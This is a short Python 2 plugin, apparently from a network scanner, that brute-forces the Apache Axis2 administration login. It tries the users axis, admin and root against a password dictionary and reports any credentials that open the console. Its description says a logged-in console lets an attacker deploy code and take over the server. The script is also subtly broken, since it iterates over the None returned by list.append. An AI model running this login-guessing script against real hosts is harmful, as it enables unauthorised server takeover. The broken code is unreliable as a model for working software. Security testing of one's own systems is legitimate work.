# coding:utf-8
# author:wolf
import urllib2
import Config


def get_plugin_info():
    plugin_info = {
        "name": "Axis2控制台弱口令",
        "info": "登陆管理控制台，通过部署功能可直接获取服务器权限。",
         "exp_url":"",
        "docker":"",
        "other":""
    }
    return plugin_info


def check(ip, port, timeout):
    url = "http://%s:%d" % (ip, int(port))
    error_i = 0
    flag_list = ['Administration Page</title>', 'System Components', '"axis2-admin/upload"',
                 'include page="footer.inc">', 'axis2-admin/logout']
    user_list = ['axis', 'admin', 'root']
    PASSWORD_DIC = Config.PASSWORD_DIC_DIR.append('axis2')
    for user in user_list:
        for password in PASSWORD_DIC:
            try:
                login_url = url + '/axis2/axis2-admin/login'
                PostStr = 'userName=%s&password=%s&submit=+Login+' % (user, password)
                request = urllib2.Request(login_url, PostStr)
                res = urllib2.urlopen(request, timeout=timeout)
                res_html = res.read()
            except urllib2.HTTPError, e:
                return
            except urllib2.URLError, e:
                error_i += 1
                if error_i >= 3:
                    return
                continue
            for flag in flag_list:
                if flag in res_html:
                    info = u'存在弱口令，用户名：%s，密码：%s' % (user, password)
                    return info
